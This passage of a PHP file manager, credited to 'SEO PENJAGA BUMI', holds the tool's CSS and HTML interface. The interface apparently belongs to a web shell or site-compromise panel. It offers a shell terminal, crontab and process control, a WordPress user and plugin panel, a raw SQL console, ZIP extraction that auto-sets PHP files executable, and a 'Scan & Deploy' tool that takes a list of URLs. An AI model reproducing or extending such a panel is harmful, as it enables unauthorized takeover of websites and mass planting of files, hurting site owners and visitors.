  justify-content: center;
  z-index: 10;
  border-radius: var(--r-md);
}

/* Scan & Deploy */
.sd-table { width:100%; border-collapse:collapse; font-size:13px; }
.sd-table th { text-align:left; padding:8px 10px; font-size:11px; font-weight:600; letter-spacing:.5px; text-transform:uppercase; color:var(--text-dim); border-bottom:1px solid var(--border); white-space:nowrap; }
.sd-table td { padding:6px 10px; border-bottom:1px solid var(--border-dim); font-size:12px; white-space:nowrap; }
.sd-table tr:hover td { background:var(--bg-overlay); }
.sd-badge { display:inline-block; padding:2px 8px; border-radius:10px; font-size:10px; font-weight:700; letter-spacing:.3px; }
.sd-badge-ok { background:rgba(52,211,153,.15); color:var(--success); }
.sd-badge-no { background:rgba(248,113,113,.15); color:var(--danger); }
.sd-badge-done { background:rgba(96,165,250,.15); color:var(--info); }
.sd-stats { display:flex; gap:16px; padding:12px 14px; background:var(--bg-overlay); border-radius:var(--r-md); margin-bottom:14px; font-size:13px; flex-wrap:wrap; }
.sd-stats b { color:var(--accent); }
.sd-url-box { width:100%; min-height:120px; max-height:300px; font-family:var(--font-mono); font-size:12px; padding:10px; background:var(--bg-overlay); border:1px solid var(--border); border-radius:var(--r-sm); color:var(--text-main); resize:vertical; }
.sd-phase { display:none; }
.sd-phase.active { display:block; }

/* LOGIN */
#login-page {
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  background: var(--bg-base);
  position: relative;
  overflow: hidden;
}
#login-page::before {
  content: '';
  position: absolute;
  width: 600px; height: 600px;
  background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
  top: -200px; left: -100px;
  pointer-events: none;
}
#login-page::after {
  content: '';
  position: absolute;
  width: 400px; height: 400px;
  background: radial-gradient(circle, rgba(96,165,250,.1) 0%, transparent 70%);
  bottom: -100px; right: -100px;
  pointer-events: none;
}
.login-card {
  background: var(--bg-raised);
  border: 1px solid var(--border);
  border-radius: var(--r-lg);
  box-shadow: var(--shadow-lg);
  padding: 40px;
  width: 100%;
  max-width: 380px;
  position: relative;
  z-index: 1;
}
.login-logo {
  text-align: center;
  margin-bottom: 28px;
}
.login-logo-icon {
  font-family: var(--font-mono);
  font-size: 52px;
  font-weight: 700;
  color: var(--accent);
  filter: drop-shadow(0 0 16px var(--accent-glow));
  display: block;
  margin-bottom: 10px;
  line-height: 1;
}
.topbar-logo-text {
  font-family: var(--font-mono);
  font-weight: 700;
  font-size: 16px;
  color: var(--accent);
  filter: drop-shadow(0 0 6px var(--accent-glow));
  line-height: 1;
}
.about-logo-text {
  font-family: var(--font-mono);
  font-weight: 700;
  font-size: 48px;
  color: var(--accent);
  filter: drop-shadow(0 0 16px var(--accent-glow));
  line-height: 1;
}
.login-title {
  font-family: var(--font-display);
  font-size: 24px;
  font-weight: 800;
  letter-spacing: -1px;
  color: var(--text-main);
}
.login-subtitle {
  font-size: 13px;
  color: var(--text-dim);
  margin-top: 4px;
}
.login-input-wrap {
  position: relative;
  margin-bottom: 14px;
}
.login-input-wrap i {
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  color: var(--text-dim);
  font-size: 14px;
  pointer-events: none;
}
.login-input-wrap .form-control { padding-left: 38px; }
.login-btn {
  width: 100%;
  padding: 11px;
  background: var(--accent);
  color: #000;
  border-radius: var(--r-sm);
  font-weight: 700;
  font-size: 14px;
  transition: all var(--transition);
  border: none;
  cursor: pointer;
  letter-spacing: 0.3px;
}
.login-btn:hover { opacity: .9; box-shadow: 0 4px 16px var(--accent-glow); }
.login-error {
  color: var(--danger);
  font-size: 13px;
  text-align: center;
  margin-top: 10px;
  min-height: 18px;
}
.login-footer {
  text-align: center;
  margin-top: 24px;
  font-size: 12px;
  color: var(--text-dim);
}

/* Search results */
.search-result {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 12px;
  border-radius: var(--r-sm);
  cursor: pointer;
  transition: background var(--transition);
  font-size: 13px;
}
.search-result:hover { background: var(--bg-overlay); }
.search-result i { color: var(--text-muted); width: 16px; text-align: center; }
.search-result .sr-path { font-size: 11px; color: var(--text-dim); }
.search-result .sr-name { font-weight: 500; }

/* Settings tabs */
.tab-nav {
  display: flex;
  gap: 4px;
  margin-bottom: 16px;
  border-bottom: 1px solid var(--border);
  padding-bottom: 0;
}
.tab-btn {
  padding: 8px 14px;
  border-radius: var(--r-sm) var(--r-sm) 0 0;
  font-size: 13px;
  font-weight: 500;
  color: var(--text-muted);
  cursor: pointer;
  transition: all var(--transition);
  border-bottom: 2px solid transparent;
  margin-bottom: -1px;
}
.tab-btn:hover { color: var(--text-main); }
.tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
.tab-pane { display: none; }
.tab-pane.active { display: block; }

/* Misc */
.badge {
  display: inline-flex;
  align-items: center;
  padding: 2px 7px;
  border-radius: 20px;
  font-size: 11px;
  font-weight: 600;
  background: var(--bg-muted);
  color: var(--text-dim);
}
.badge-success { background: rgba(52,211,153,.15); color: var(--success); }
.badge-danger  { background: rgba(248,113,113,.15); color: var(--danger); }
.badge-accent  { background: var(--accent-dim); color: var(--accent); }
.text-muted { color: var(--text-muted); }
.text-dim   { color: var(--text-dim); }
.text-accent { color: var(--accent); }
.mono { font-family: var(--font-mono); }
code {
  background: var(--bg-overlay);
  padding: 1px 5px;
  border-radius: 4px;
  font-family: var(--font-mono);
  font-size: 12px;
}
.mt-2 { margin-top: 8px; }
.mt-3 { margin-top: 12px; }
.mt-4 { margin-top: 16px; }
.flex { display: flex; }
.gap-2 { gap: 8px; }
.gap-1 { gap: 4px; }
.items-center { align-items: center; }
.flex-wrap { flex-wrap: wrap; }
.w-full { width: 100%; }

/* Responsive */
@media (max-width: 768px) {
  :root { --sidebar-w: 0px; }
  #sidebar { display: none; }
  #app {
    grid-template-columns: 1fr;
    grid-template-areas: "topbar" "main";
  }
  .topbar-brand { min-width: auto; }
}
</style>
</head>
<body>

<div id="toast-container"></div>
<div id="ctx-menu" style="display:none"></div>

<?php if (!$is_logged): ?>
<!-- ═══════════════════════════════════ LOGIN ═══════ -->
<div id="login-page">
  <div class="login-card">
    <div class="login-logo">
      <span class="login-logo-icon">_&lt;</span>
      <div class="login-title"><?= htmlspecialchars(FM_TITLE) ?></div>
      <div class="login-subtitle">v<?= FM_VERSION ?> &mdash; Secure File Manager</div>
    </div>
    <div class="login-input-wrap">
      <i class="fa-solid fa-user"></i>
      <input type="text" id="login-user" class="form-control" placeholder="<?= t('username') ?>" autocomplete="username">
    </div>
    <div class="login-input-wrap">
      <i class="fa-solid fa-lock"></i>
      <input type="password" id="login-pass" class="form-control" placeholder="<?= t('password') ?>" autocomplete="current-password">
    </div>
    <button class="login-btn" id="login-btn" onclick="doLogin()">
      <i class="fa-solid fa-right-to-bracket" style="margin-right:6px"></i><?= t('login') ?>
    </button>
    <div class="login-error" id="login-error"></div>
    <div class="login-footer">File Manager &copy; <?= date('Y') ?> &mdash; Created by SEO PENJAGA BUMI</div>
  </div>
</div>

<?php else: ?>
<!-- ═══════════════════════════════════ APP ════════ -->
<div id="app">

  <!-- TOPBAR -->
  <header id="topbar">
    <div class="topbar-brand">
      <span class="topbar-logo-text">_&lt;</span>
      <div class="topbar-brand-text">
        <span class="topbar-brand-title"><?= htmlspecialchars(FM_TITLE) ?></span>
        <span class="topbar-brand-sub">by SEO PENJAGA BUMI</span>
      </div>
    </div>
    <div id="breadcrumb"></div>
    <div class="topbar-actions">
      <div id="searchbar">
        <i class="fa-solid fa-search" style="font-size:12px; flex-shrink:0"></i>
        <input type="text" id="search-input" placeholder="<?= t('search') ?>..." autocomplete="off">
      </div>
      <div class="topbar-divider"></div>
      <button class="icon-btn" id="btn-toggle-view" title="Toggle View" onclick="toggleView()">
        <i class="fa-solid fa-table-cells-large" id="view-icon"></i>
      </button>
      <?php if (!$is_readonly): ?>
      <button class="icon-btn" id="btn-terminal" title="<?= t('terminal') ?>" onclick="toggleTerminal()">
        <i class="fa-solid fa-terminal"></i>
      </button>
      <?php endif; ?>
      <button class="icon-btn" id="btn-theme" title="Toggle Theme" onclick="toggleTheme()">
        <i class="fa-solid fa-moon" id="theme-icon"></i>
      </button>
      <?php if (!$is_readonly): ?>
      <button class="icon-btn" title="<?= t('settings') ?>" onclick="openSettings()">
        <i class="fa-solid fa-gear"></i>
      </button>
      <button class="icon-btn" title="Crontab" onclick="openCrontab()">
        <i class="fa-solid fa-clock-rotate-left"></i>
      </button>
      <button class="icon-btn" title="Processes" onclick="openProcesses()">
        <i class="fa-solid fa-microchip"></i>
      </button>
      <?php endif; ?>
      <div class="topbar-divider"></div>

      <button class="icon-btn" title="<?= t('logout') ?>" onclick="doLogout()">
        <i class="fa-solid fa-right-from-bracket"></i>
      </button>
    </div>
  </header>

  <!-- SIDEBAR -->
  <aside id="sidebar">
    <div class="sidebar-section-title"><?= t('home') ?></div>
    <div id="folder-tree"></div>
    <div class="sidebar-info" id="sidebar-stats"></div>
    <div class="sidebar-user">
      <div class="user-avatar"><?= strtoupper(substr($current_user, 0, 1)) ?></div>
      <div class="sidebar-user-info">
        <div class="sidebar-user-name"><?= htmlspecialchars($current_user) ?></div>
        <div class="sidebar-user-role"><?= $is_readonly ? '<span class="badge badge-danger">'.t('readonly_msg').'</span>' : '<span class="badge badge-success">Admin</span>' ?></div>
      </div>
    </div>
  </aside>

  <!-- MAIN -->
  <main id="main">
    <div id="toolbar">
      <?php if (!$is_readonly): ?>
      <button class="btn btn-primary btn-sm" onclick="openNewItem()">
        <i class="fa-solid fa-plus"></i><?= t('new_item') ?>
      </button>
      <button class="btn btn-ghost btn-sm" onclick="openUpload()">
        <i class="fa-solid fa-cloud-arrow-up"></i><?= t('upload') ?>
      </button>
      <button class="btn btn-ghost btn-sm btn-zipx" onclick="openUploadExtract()" title="Upload ZIP &amp; extract to this folder (PHP auto-0755)">
        <i class="fa-solid fa-bolt" style="color:#fbbf24"></i> ZIP Extract
      </button>
      <?php if (fm_wp_detect()): ?>
      <button class="btn btn-ghost btn-sm btn-wpx" onclick="openWpPanel()" title="WordPress panel (detected: <?= htmlspecialchars(fm_wp_detect()) ?>)">
        <i class="fa-brands fa-wordpress" style="color:#3399ff"></i> WordPress
      </button>
      <?php endif; ?>
      <?php if (fm_db_detect()): ?>
      <button class="btn btn-ghost btn-sm btn-dbx" onclick="openDbPanel()" title="Database panel">
        <i class="fa-solid fa-database" style="color:#f59e0b"></i> Database
      </button>
      <?php endif; ?>
      <div class="topbar-divider" style="height:20px"></div>
      <button class="btn btn-ghost btn-sm" id="btn-copy-to" onclick="openCopyMove('copy')" style="display:none">
        <i class="fa-regular fa-copy"></i><?= t('copy_to') ?>
      </button>
      <button class="btn btn-ghost btn-sm" id="btn-move-to" onclick="openCopyMove('move')" style="display:none">
        <i class="fa-solid fa-arrows-up-down-left-right"></i><?= t('move_to') ?>
      </button>
      <button class="btn btn-ghost btn-sm" id="btn-zip-sel" onclick="openZip()" style="display:none">
        <i class="fa-solid fa-file-zipper"></i><?= t('zip_selected') ?>
      </button>
      <button class="btn btn-danger btn-sm" id="btn-delete-sel" onclick="deleteSelected()" style="display:none">
        <i class="fa-solid fa-trash"></i><?= t('delete') ?>
      </button>
      <div class="topbar-divider" style="height:20px"></div>
      <button class="btn btn-success btn-sm" onclick="openScanDeploy()">
        <i class="fa-solid fa-satellite-dish"></i> Scan &amp; Deploy
      </button>
      <button class="btn btn-ghost btn-sm btn-backup" id="btn-backup" onclick="openBackupPanel()">
        <i class="fa-solid fa-shield" style="color:var(--success)"></i> <span id="btn-backup-label">Backup</span>
      </button>
      <?php endif; ?>
      <span class="selection-info" id="sel-info"></span>
      <div class="toolbar-sep"></div>
      <button class="btn btn-ghost btn-sm" onclick="navigate(state.path)" title="<?= t('refresh') ?>">
        <i class="fa-solid fa-rotate-right"></i>
      </button>
      <button class="btn btn-ghost btn-sm" onclick="goBack()" title="<?= t('back') ?>">
        <i class="fa-solid fa-arrow-left"></i>
      </button>
    </div>

    <div id="files-container">
      <div class="drop-overlay" id="drop-overlay">
        <i class="fa-solid fa-cloud-arrow-up"></i> Drop files to upload
      </div>
      <div id="files-grid"></div>
      <table id="files-table">
        <thead>
          <tr>
            <th class="td-check"><input type="checkbox" class="cb" id="select-all" onchange="toggleSelectAll(this.checked)"></th>
            <th onclick="sortBy('name')"><i class="fa-solid fa-font" style="font-size:10px"></i> <?= t('name') ?> <span class="sort-icon" id="sort-name"></span></th>
            <th onclick="sortBy('size')"><i class="fa-solid fa-weight-hanging" style="font-size:10px"></i> <?= t('size') ?> <span class="sort-icon" id="sort-size"></span></th>
            <th onclick="sortBy('mtime')"><i class="fa-solid fa-clock" style="font-size:10px"></i> <?= t('modified') ?> <span class="sort-icon" id="sort-mtime"></span></th>
            <th class="perms-col"><?= t('perms') ?></th>
            <th class="perms-col"><?= t('owner') ?></th>
            <th style="width:80px"><?= t('actions') ?></th>
          </tr>
        </thead>
        <tbody id="files-tbody"></tbody>
      </table>
      <div class="empty-state" id="empty-state" style="display:none">
        <i class="fa-regular fa-folder-open"></i>
        <p><?= t('empty_folder') ?></p>
      </div>
    </div>

    <div id="statusbar">
      <span id="sb-path" class="mono" style="font-size:11px; color:var(--text-dim)"></span>
      <span class="sb-sep">|</span>
      <span id="sb-counts"></span>
      <span class="sb-sep">|</span>
      <span id="sb-size"></span>
    </div>
  </main>

  <!-- TERMINAL -->
  <?php if (!$is_readonly): ?>
  <div id="terminal-panel" style="display:none">
    <div class="terminal-header">
      <i class="fa-solid fa-terminal" style="color:#6ee7b7; font-size:12px"></i>
      <span id="term-cwd">~</span>
      <button class="icon-btn" style="margin-left:auto" onclick="clearTerminal()" title="Clear">
        <i class="fa-solid fa-eraser" style="font-size:11px; color:#8b949e"></i>
      </button>
      <button class="icon-btn" onclick="toggleTerminal()" title="Close">
        <i class="fa-solid fa-xmark" style="font-size:13px; color:#8b949e"></i>
      </button>
    </div>
    <div id="terminal-output"></div>
    <div class="terminal-input-row">
      <span class="term-prompt-label" id="term-prompt-label">$</span>
      <input type="text" id="terminal-input" placeholder="<?= t('enter_cmd') ?>" autocomplete="off" spellcheck="false">
    </div>
  </div>
  <?php endif; ?>

</div><!-- #app -->
<?php endif; ?>

<!-- ══════════ MODALS ══════════ -->

<!-- New Item -->
<div class="modal-backdrop" id="modal-new-item">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-plus" style="color:var(--accent)"></i>
      <h3><?= t('new_item') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-new-item')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div class="radio-group mb-3" style="margin-bottom:16px">
        <div class="radio-btn selected" id="rb-folder" onclick="selectNewType('folder')">
          <i class="fa-solid fa-folder" style="color:#fbbf24"></i>
          <span><?= t('new_folder') ?></span>
        </div>
        <div class="radio-btn" id="rb-file" onclick="selectNewType('file')">
          <i class="fa-regular fa-file"></i>
          <span><?= t('new_file') ?></span>
        </div>
      </div>
      <div class="form-group">
        <label><?= t('name') ?></label>
        <input type="text" id="new-item-name" class="form-control" placeholder="<?= t('enter_name') ?>" autocomplete="off">
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-new-item')"><?= t('cancel') ?></button>
      <button class="btn btn-primary" onclick="createNewItem()"><?= t('confirm') ?></button>
    </div>
  </div>
</div>

<!-- Rename -->
<div class="modal-backdrop" id="modal-rename">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-pen" style="color:var(--accent)"></i>
      <h3><?= t('rename') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-rename')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label><?= t('name') ?></label>
        <input type="text" id="rename-input" class="form-control" autocomplete="off">
        <input type="hidden" id="rename-from">
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-rename')"><?= t('cancel') ?></button>
      <button class="btn btn-primary" onclick="doRename()"><?= t('confirm') ?></button>
    </div>
  </div>
</div>

<!-- Confirm Delete -->
<div class="modal-backdrop" id="modal-confirm">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-triangle-exclamation" style="color:var(--danger)"></i>
      <h3 id="confirm-title"><?= t('delete') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-confirm')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <p id="confirm-message" style="color:var(--text-muted)"></p>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-confirm')"><?= t('cancel') ?></button>
      <button class="btn btn-danger" id="confirm-ok" onclick=""><?= t('confirm') ?></button>
    </div>
  </div>
</div>

<!-- Upload -->
<div class="modal-backdrop" id="modal-upload">
  <div class="modal modal-lg">
    <div class="modal-header">
      <i class="fa-solid fa-cloud-arrow-up" style="color:var(--accent)"></i>
      <h3><?= t('upload') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-upload')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div id="upload-zone" onclick="document.getElementById('file-input').click()">
        <input type="file" id="file-input" multiple style="display:none" onchange="handleFileSelect(this.files)">
        <i class="fa-solid fa-cloud-arrow-up" style="display:block; margin:0 auto 10px"></i>
        <p style="font-size:14px; font-weight:600"><?= t('drag_drop') ?></p>
        <p style="font-size:12px; color:var(--text-dim); margin-top:6px">Max <?= $CONFIG['max_upload_mb'] ?>MB per file</p>
      </div>
      <div id="upload-list"></div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-upload')"><?= t('close') ?></button>
    </div>
  </div>
</div>

<!-- ZIP Upload + Extract Here -->
<div class="modal-backdrop" id="modal-upload-extract">
  <div class="modal modal-lg">
    <div class="modal-header">
      <i class="fa-solid fa-bolt" style="color:#fbbf24"></i>
      <h3>ZIP Extract &mdash; Upload &amp; Activate</h3>
      <button class="icon-btn" onclick="closeModal('modal-upload-extract')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div id="zx-zone" onclick="document.getElementById('zx-input').click()">
        <input type="file" id="zx-input" accept=".zip" style="display:none" onchange="handleZipSelect(this.files)">
        <i class="fa-solid fa-file-zipper zx-main" style="display:block; margin:0 auto"></i>
        <p style="font-size:14px; font-weight:600; color:#fbbf24">Drop a .zip file here &mdash; or click to pick one</p>
        <p style="font-size:12px; color:var(--text-dim); margin-top:6px">Files land <strong>directly</strong> in this folder. Max <?= $CONFIG['max_upload_mb'] ?>MB.</p>
      </div>
      <div class="zx-hint">
        <i class="fa-solid fa-circle-info"></i>
        <div>
          <strong>PHP files auto-activate</strong> &mdash; chmod <code>0755</code> on every <code>*.php</code>, <code>0644</code> on the rest. Existing files with the same name get overwritten. Entries that try to escape this folder (<code>../</code>) are rejected.
        </div>
      </div>
      <div id="zx-list"></div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-upload-extract')"><?= t('close') ?></button>
    </div>
  </div>
</div>

<!-- WordPress Panel -->
<div class="modal-backdrop" id="modal-wp">
  <div class="modal modal-xl">
    <div class="modal-header">
      <i class="fa-brands fa-wordpress" style="color:#3399ff"></i>
      <h3>WordPress Panel</h3>
      <div style="display:flex;gap:6px;margin-left:auto">
        <button class="icon-btn" onclick="wpReload()" title="Reload"><i class="fa-solid fa-rotate-right"></i></button>
        <button class="icon-btn" onclick="closeModal('modal-wp')"><i class="fa-solid fa-xmark"></i></button>
      </div>
    </div>
    <div id="wp-tabs">
      <div class="wp-tab active" data-tab="info"    onclick="wpSwitchTab('info')"><i class="fa-solid fa-circle-info"></i> Info</div>
      <div class="wp-tab"        data-tab="users"   onclick="wpSwitchTab('users')"><i class="fa-solid fa-users"></i> Users</div>
      <div class="wp-tab"        data-tab="plugins" onclick="wpSwitchTab('plugins')"><i class="fa-solid fa-plug"></i> Plugins</div>
    </div>
    <div class="modal-body" style="padding:0; max-height:70vh; overflow-y:auto">
      <div class="wp-pane active" id="wp-pane-info">
        <div id="wp-info-body"><div class="spinner"></div></div>
      </div>
      <div class="wp-pane" id="wp-pane-users">
        <div id="wp-users-body"><div class="spinner"></div></div>
      </div>
      <div class="wp-pane" id="wp-pane-plugins">
        <div class="wp-plug-upload" id="wp-plug-upload" onclick="document.getElementById('wp-plug-input').click()">
          <input type="file" id="wp-plug-input" accept=".zip" style="display:none" onchange="wpPluginUpload(this.files[0])">
          <i class="fa-solid fa-upload" style="font-size:22px; color:#3399ff"></i>
          <p style="font-size:13px; margin-top:6px">Drop or click to upload a plugin <code>.zip</code></p>
        </div>
        <div id="wp-plug-upload-status"></div>
        <div id="wp-plugins-body"><div class="spinner"></div></div>
      </div>
    </div>
  </div>
</div>

<!-- Database Panel -->
<div class="modal-backdrop" id="modal-database">
  <div class="modal modal-xl">
    <div class="modal-header">
      <i class="fa-solid fa-database" style="color:#f59e0b"></i>
      <h3>Database</h3>
      <div style="display:flex;gap:6px;margin-left:auto">
        <button class="icon-btn" onclick="dbReload()" title="Reload"><i class="fa-solid fa-rotate-right"></i></button>
        <button class="icon-btn" onclick="closeModal('modal-database')"><i class="fa-solid fa-xmark"></i></button>
      </div>
    </div>
    <div id="db-tabs">
      <div class="wp-tab active" data-tab="db-info"    onclick="dbSwitchTab('db-info')"><i class="fa-solid fa-circle-info"></i> Info</div>
      <div class="wp-tab"        data-tab="db-tables"  onclick="dbSwitchTab('db-tables')"><i class="fa-solid fa-table"></i> Tables</div>
      <div class="wp-tab"        data-tab="db-browse"  onclick="dbSwitchTab('db-browse')"><i class="fa-solid fa-table-list"></i> Browse</div>
      <div class="wp-tab"        data-tab="db-query"   onclick="dbSwitchTab('db-query')"><i class="fa-solid fa-terminal"></i> SQL</div>
    </div>
    <div class="modal-body" style="padding:0; max-height:70vh; overflow-y:auto">
      <div class="wp-pane active" id="db-pane-db-info">
        <div id="db-info-body"><div class="spinner"></div></div>
      </div>
      <div class="wp-pane" id="db-pane-db-tables">
        <div id="db-tables-body"><div class="spinner"></div></div>
      </div>
      <div class="wp-pane" id="db-pane-db-browse">
        <div id="db-browse-bar" style="display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid var(--border-dim);flex-wrap:wrap">
          <span style="font-size:12px;color:var(--text-muted)">Table:</span>
          <strong id="db-browse-table" style="font-size:13px;color:var(--accent)">—</strong>
          <div style="margin-left:auto;display:flex;gap:6px;align-items:center">
            <button class="btn btn-ghost btn-sm" id="db-prev" onclick="dbBrowsePage(-1)" disabled><i class="fa-solid fa-chevron-left"></i></button>
            <span id="db-page-info" style="font-size:12px;color:var(--text-muted)">—</span>
            <button class="btn btn-ghost btn-sm" id="db-next" onclick="dbBrowsePage(1)" disabled><i class="fa-solid fa-chevron-right"></i></button>
          </div>
        </div>
        <div id="db-browse-body" style="overflow:auto;max-height:55vh"><p style="color:var(--text-dim);padding:20px;text-align:center">Select a table from the Tables tab</p></div>
      </div>
      <div class="wp-pane" id="db-pane-db-query">
        <div style="padding:14px">
          <textarea id="db-sql-input" class="form-control mono" rows="4" placeholder="SELECT * FROM wp_users LIMIT 10" style="resize:vertical;min-height:60px"></textarea>
          <div style="margin-top:8px;display:flex;gap:8px;align-items:center">
            <button class="btn btn-primary btn-sm" onclick="dbRunQuery()"><i class="fa-solid fa-play"></i> Execute</button>
            <span id="db-query-status" style="font-size:12px;color:var(--text-muted)"></span>
          </div>
        </div>
        <div id="db-query-body" style="overflow:auto;max-height:50vh;padding:0 14px 14px"></div>
      </div>
    </div>
  </div>
</div>

<!-- File Preview / Editor -->
<div class="modal-backdrop" id="modal-preview">
  <div class="modal modal-xl">
    <div class="modal-header">
      <i class="fa-regular fa-eye" style="color:var(--accent)" id="preview-icon"></i>
      <h3 id="preview-title"></h3>
      <div style="display:flex;gap:6px;margin-left:auto">
        <button class="btn btn-ghost btn-sm" id="btn-preview-download" onclick="downloadFile(state.previewFile)">
          <i class="fa-solid fa-download"></i><?= t('download') ?>
        </button>
        <?php if (!$is_readonly): ?>
        <button class="btn btn-ghost btn-sm" id="btn-preview-edit" onclick="openEditor(state.previewFile)" style="display:none">
          <i class="fa-solid fa-pen"></i><?= t('edit') ?>
        </button>
        <?php endif; ?>
        <button class="icon-btn" onclick="closeModal('modal-preview')"><i class="fa-solid fa-xmark"></i></button>
      </div>
    </div>
    <div class="modal-body" id="preview-body">
      <div id="preview-content"></div>
    </div>
  </div>
</div>

<!-- Editor -->
<div class="modal-backdrop" id="modal-editor">
  <div class="modal modal-xl">
    <div class="modal-header">
      <i class="fa-solid fa-code" style="color:var(--accent)"></i>
      <h3 id="editor-title"></h3>
      <div style="display:flex;gap:6px;margin-left:auto">
        <button class="btn btn-success btn-sm" onclick="saveFile()">
          <i class="fa-solid fa-floppy-disk"></i><?= t('save') ?>
        </button>
        <button class="icon-btn" onclick="closeModal('modal-editor')"><i class="fa-solid fa-xmark"></i></button>
      </div>
    </div>
    <div id="editor-wrap">
      <textarea id="code-editor"></textarea>
    </div>
  </div>
</div>

<!-- Copy/Move -->
<div class="modal-backdrop" id="modal-copy-move">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-arrows-up-down-left-right" style="color:var(--accent)"></i>
      <h3 id="copy-move-title"></h3>
      <button class="icon-btn" onclick="closeModal('modal-copy-move')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label><?= t('destination') ?></label>
        <input type="text" id="copy-move-dest" class="form-control mono" placeholder="path/to/destination">
      </div>
      <p style="font-size:12px; color:var(--text-dim)">Leave empty for root. Current path: <code id="copy-move-current"></code></p>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-copy-move')"><?= t('cancel') ?></button>
      <button class="btn btn-primary" onclick="doCopyMove()" id="copy-move-btn">OK</button>
    </div>
  </div>
</div>

<!-- ZIP -->
<div class="modal-backdrop" id="modal-zip">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-file-zipper" style="color:var(--accent)"></i>
      <h3><?= t('compress') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-zip')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label><?= t('zip_name') ?></label>
        <input type="text" id="zip-name" class="form-control" placeholder="archive.zip">
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-zip')"><?= t('cancel') ?></button>
      <button class="btn btn-primary" onclick="doZip()"><?= t('compress') ?></button>
    </div>
  </div>
</div>

<!-- Permissions -->
<div class="modal-backdrop" id="modal-chmod">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-shield-halved" style="color:var(--accent)"></i>
      <h3><?= t('change_perms') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-chmod')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <p style="font-size:12px; color:var(--text-muted); margin-bottom:12px" id="chmod-file"></p>
      <div class="chmod-grid">
        <div></div>
        <div class="chmod-header">Owner</div>
        <div class="chmod-header">Group</div>
        <div class="chmod-header">Other</div>
        <div class="chmod-header">Read</div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-ur"></div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-gr"></div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-or"></div>
        <div class="chmod-header">Write</div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-uw"></div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-gw"></div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-ow"></div>
        <div class="chmod-header">Execute</div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-ux"></div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-gx"></div>
        <div class="chmod-cell"><input type="checkbox" class="cb" id="cm-ox"></div>
      </div>
      <p style="margin-top:12px; font-family:var(--font-mono); font-size:13px; color:var(--accent)" id="chmod-octal"></p>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-chmod')"><?= t('cancel') ?></button>
      <button class="btn btn-primary" onclick="doChmod()"><?= t('change') ?></button>
    </div>
  </div>
</div>

<!-- Properties -->
<div class="modal-backdrop" id="modal-props">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-circle-info" style="color:var(--accent)"></i>
      <h3><?= t('properties') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-props')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div class="props-grid" id="props-grid"></div>
    </div>
  </div>
</div>

<!-- Search Results -->
<div class="modal-backdrop" id="modal-search">
  <div class="modal modal-lg">
    <div class="modal-header">
      <i class="fa-solid fa-magnifying-glass" style="color:var(--accent)"></i>
      <h3><?= t('search') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-search')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div style="display:flex;gap:8px;margin-bottom:12px">
        <input type="text" id="search-full-input" class="form-control" placeholder="<?= t('search') ?>..." autocomplete="off">
        <button class="btn btn-primary" onclick="doSearch()"><i class="fa-solid fa-search"></i></button>
      </div>
      <div id="search-results"></div>
    </div>
  </div>
</div>

<!-- Settings -->
<div class="modal-backdrop" id="modal-settings">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-gear" style="color:var(--accent)"></i>
      <h3><?= t('settings') ?></h3>
      <button class="icon-btn" onclick="closeModal('modal-settings')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div class="tab-nav">
        <button class="tab-btn active" onclick="switchTab(this,'tab-general')">General</button>
